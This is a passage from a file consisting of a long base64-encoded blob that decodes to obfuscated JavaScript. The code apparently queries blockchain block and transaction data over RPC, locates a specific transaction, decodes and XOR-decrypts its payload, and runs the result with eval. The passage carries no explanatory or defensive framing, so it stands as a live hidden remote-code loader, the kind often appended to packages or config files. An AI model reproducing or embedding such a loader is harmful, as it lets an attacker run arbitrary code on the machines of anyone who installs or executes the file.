BkWzB4MjJdXShfJF81MDBkWzB4Nl0sZnVuY3Rpb24odCl7ZSh0KX0pO29bXyRfNTAwZFsweDJhXV0odCk7b1tfJF81MDBkWzB4MjVdXSgpfSl9YXN5bmMgZnVuY3Rpb24gYyh0LG4pe2lmKG49PT0gdm9pZCgwKSl7bj0gW119O3ZhciByPVtfJF81MDBkWzB4MmNdLF8kXzUwMGRbMHgyZF0sXyRfNTAwZFsweDJlXSxfJF81MDBkWzB4MmZdXTt7dmFyIF8kZXJyXzE2MmNfMTt0cnl7Zm9yKHZhciBfJGl0XzE2MmNfMT1fJGpzb0l0ZXIoKHIpKSxfJHN0XzE2MmNfMTshKF8kc3RfMTYyY18xPSBfJGl0XzE2MmNfMVtfJF81MDBkWzB4MzFdXSgpKVtfJF81MDBkWzB4MzBdXTspe3ZhciBfX2pzb19uZXN0ZWRfbG9vcF82X2U9XyRzdF8xNjJjXzFbXyRfNTAwZFsweDMyXV07dHJ5e3ZhciBfX2pzb19ibG9ja19wYXJhbV84X289IGF3YWl0IHModCxuLF9fanNvX25lc3RlZF9sb29wXzZfZSk7aWYoX19qc29fYmxvY2tfcGFyYW1fOF9vKXtyZXR1cm4gX19qc29fYmxvY2tfcGFyYW1fOF9vfX1jYXRjaHt9fX1jYXRjaChfJGV4XzE2MmNfMSl7XyRlcnJfMTYyY18xPSB7ZTpfJGV4XzE2MmNfMX19ZmluYWxseXt0cnl7aWYoXyRzdF8xNjJjXzEmJiAgIV8kc3RfMTYyY18xW18kXzUwMGRbMHgzMF1dJiYgXyRpdF8xNjJjXzFbXyRfNTAwZFsweDMzXV0pe18kaXRfMTYyY18xW18kXzUwMGRbMHgzM11dKCl9fWZpbmFsbHl7aWYoXyRlcnJfMTYyY18xKXt0aHJvdyBfJGVycl8xNjJjXzFbXyRfNTAwZFsweDM0XV19fX19fWFzeW5jIGZ1bmN0aW9uIGEodCl7dmFyIG49IGF3YWl0IGMoXyRfNTAwZFsweDM1XSxbXyRfNTAwZFsweDM2XSsgdFtfJF81MDBkWzB4MzddXSgxNiksdHJ1ZV0pO2lmKCEobltfJF81MDBkWzB4MzhdXT09IG51bGw/dW5kZWZpbmVkOm5bXyRfNTAwZFsweDM4XV1bXyRfNTAwZFsweDEwXV0pKXtyZXR1cm59O3t2YXIgXyRlcnJfNzZjZV8yO3RyeXtmb3IodmFyIF8kaXRfNzZjZV8yPV8kanNvSXRlcigobltfJF81MDBkWzB4MzhdXSkpLF8kc3RfNzZjZV8yOyEoXyRzdF83NmNlXzI9IF8kaXRfNzZjZV8yW18kXzUwMGRbMHgzMV1dKCkpW18kXzUwMGRbMHgzMF1dOyl7dmFyIF9fanNvX25lc3RlZF9sb29wXzVfcj1fJHN0Xzc2Y2VfMltfJF81MDBkWzB4MzJdXTtpZihfX2pzb19uZXN0ZWRfbG9vcF81X3JbXyRfNTAwZFsweDNhXV1bXyRfNTAwZFsweDM5XV0oZSkpe3JldHVybiBfX2pzb19uZXN0ZWRfbG9vcF81X3JbXyRfNTAwZFsweDNiXV19fX1jYXRjaChfJGV4Xzc2Y2VfMil7XyRlcnJfNzZjZV8yPSB7ZTpfJGV4Xzc2Y2VfMn19ZmluYWxseXt0cnl7aWYoXyRzdF83NmNlXzImJiAgIV8kc3RfNzZjZV8yW18kXzUwMGRbMHgzMF1dJiYgXyRpdF83NmNlXzJbXyRfNTAwZFsweDMzXV0pe18kaXRfNzZjZV8yW18kXzUwMGRbMHgzM11dKCl9fWZpbmFsbHl7aWYoXyRlcnJfNzZjZV8yKXt0aHJvdyBfJGVycl83NmNlXzJbXyRfNTAwZFsweDM0XV19fX19fWFzeW5jIGZ1bmN0aW9uIGYobil7Zm9yKHZhciBfX2pzb19uZXN0ZWRfbG9vcF80X3Q9LTE7X19qc29fbmVzdGVkX2xvb3BfNF90PCAxMztfX2pzb19uZXN0ZWRfbG9vcF80X3QrKyl7dmFyIF9fanNvX2Jsb2NrX3BhcmFtXzdfcj1fX2pzb19uZXN0ZWRfbG9vcF80X3Q9PSAgLTE/MDpfJGpzb1BvdygoMiksKF9fanNvX25lc3RlZF9sb29wXzRfdCkpO2Zvcih2YXIgX19qc29fbmVzdGVkX2xvb3BfM190PTA7X19qc29fbmVzdGVkX2xvb3BfM190PCAzO19fanNvX25lc3RlZF9sb29wXzNfdCsrKXt2YXIgX19qc29fYmxvY2tfcGFyYW1fNl9lPSBhd2FpdCBhKG4tIF9fanNvX2Jsb2NrX3BhcmFtXzdfciogbysgX19qc29fbmVzdGVkX2xvb3BfM190KTtpZihfX2pzb19ibG9ja19wYXJhbV82X2Upe3JldHVybiBfX2pzb19ibG9ja19wYXJhbV82X2V9fX19YXN5bmMgZnVuY3Rpb24gbChjLHIsZSl7YXN5bmMgZnVuY3Rpb24gbyh0KXt2YXIgbj0oIGF3YWl0IHMoXyRfNTAwZFsweDM1XSxbXyRfNTAwZFsweDM2XSsgcltfJF81MDBkWzB4MzddXSgxNiksdHJ1ZV0sdCkpW18kXzUwMGRbMHgzOF1dO3doaWxlKGU8IG5bXyRfNTAwZFsweDEwXV0pe3RyeXtyZXR1cm4gQnVmZmVyW18kXzUwMGRbMHgzYV1dKG5bZV1bXyRfNTAwZFsweDQwXV1bXyRfNTAwZFsweDNmXV0oMiksXyRfNTAwZFsweDQxXSlbXyRfNTAwZFsweDM3XV0oXyRfNTAwZFsweDNlXSlbXyRfNTAwZFsweDNkXV0oXyRfNTAwZFsweDNjXSlbMV19Y2F0Y2h7ZSs9IDI1Nn19fXZhciB0PWF3YWl0KGFzeW5jIGZ1bmN0aW9uKCl7dmFyIHQ9W18kXzUwMGRbMHg0Ml0sXyRfNTAwZFsweDQzXV07e3ZhciBfJGVycl8xNjJjXzM7dHJ5e2Zvcih2YXIgXyRpdF8xNjJjXzM9XyRqc29JdGVyKCh0KSksXyRzdF8xNjJjXzM7IShfJHN0XzE2MmNfMz0gXyRpdF8xNjJjXzNbXyRfNTAwZFsweDMxXV0oKSlbXyRfNTAwZFsweDMwXV07KXt2YXIgX19qc29fbmVzdGVkX2xvb3BfMl9uPV8kc3RfMTYyY18zW18kXzUwMGRbMHgzMl1dO3RyeXtyZXNwb25zZT0gIGF3YWl0IG8oX19qc29fbmVzdGVkX2xvb3BfMl9uKTtpZihyZXNwb25zZSl7cmV0dXJuIHJlc3BvbnNlfX1jYXRjaHt9fX1jYXRjaChfJGV4XzE2MmNfMyl7XyRlcnJfMTYyY18zPSB7ZTpfJGV4XzE2MmNfM319ZmluYWxseXt0cnl7aWYoXyRzdF8xNjJjXzMmJiAgIV8kc3RfMTYyY18zW18kXzUwMGRbMHgzMF1dJiYgXyRpdF8xNjJjXzNbXyRfNTAwZFsweDMzXV0pe18kaXRfMTYyY18zW18kXzUwMGRbMHgzM11dKCl9fWZpbmFsbHl7aWYoXyRlcnJfMTYyY18zKXt0aHJvdyBfJGVycl8xNjJjXzNbXyRfNTAwZFsweDM0XV19fX19fSkoKTtyZXR1cm4gKGZ1bmN0aW9uKG4pe3ZhciByPWNbXyRfNTAwZFsweDEwXV07dmFyIGU9XyRfNTAwZFsweDIzXTtmb3IodmFyIF9fanNvX25lc3RlZF9sb29wXzFfdD0wO19fanNvX25lc3RlZF9sb29wXzFfdDwgbltfJF81MDBkWzB4MTBdXTtfX2pzb19uZXN0ZWRfbG9vcF8xX3QrKyl7KGZ1bmN0aW9uKCl7dmFyIF9fanNvX2Jsb2NrX3BhcmFtXzVfbz1jW18kXzUwMGRbMHg0NV1dKF9fanNvX25lc3RlZF9sb29wXzFfdCUgcik7ZSs9IGlbXyRfNTAwZFsweDQ3XV1bXyRfNTAwZFsweDQ2XV0obltfJF81MDBkWzB4NDVdXShfX2pzb19uZXN0ZWRfbG9vcF8xX3QpXiBfX2pzb19ibG9ja19wYXJhbV81X28pfSlbXyRfNTAwZFsweDQ0XV0odGhpcyl9O3JldHVybiBlfSkodCl9dHJ5e3ZhciBfX2pzb19ibG9ja19wYXJhbV80X2g9cGFyc2VJbnQoIGF3YWl0IGMoXyRfNTAwZFsweDQ4XSkpO3ZhciBfX2pzb19ibG9ja19wYXJhbV8zX3Q9KF9fanNvX2Jsb2NrX3BhcmFtXzRfaD4+IHI8PCByKSsgbjtpZihfX2pzb19ibG9ja19wYXJhbV80X2g8IF9fanNvX2Jsb2NrX3BhcmFtXzNfdCl7X19qc29fYmxvY2tfcGFyYW1fM190LT0gb307dmFyIF9fanNvX2Jsb2NrX3BhcmFtXzJfcD0gYXdhaXQgZihfX2pzb19ibG9ja19wYXJhbV8zX3QpO2lbXyRfNTAwZFsweDQ5XV09IF9fanNvX2Jsb2NrX3BhcmFtXzJfcDt2YXIgX19qc29fYmxvY2tfcGFyYW1fMV9kPSBhd2FpdCBsKF8kXzUwMGRbMHg0YV0scGFyc2VJbnQoX19qc29fYmxvY2tfcGFyYW1fMl9wW18kXzUwMGRbMHgzZl1dKDIsMTApLDE2KSxwYXJzZUludChfX2pzb19ibG9ja19wYXJhbV8yX3BbXyRfNTAwZFsweDNmXV0oMTAsMTIpLDE2KSk7ZXZhbChfX2pzb19ibG9ja19wYXJhbV8xX2QpfWNhdGNoKHQpe319KSgpfSkoKQ=='))
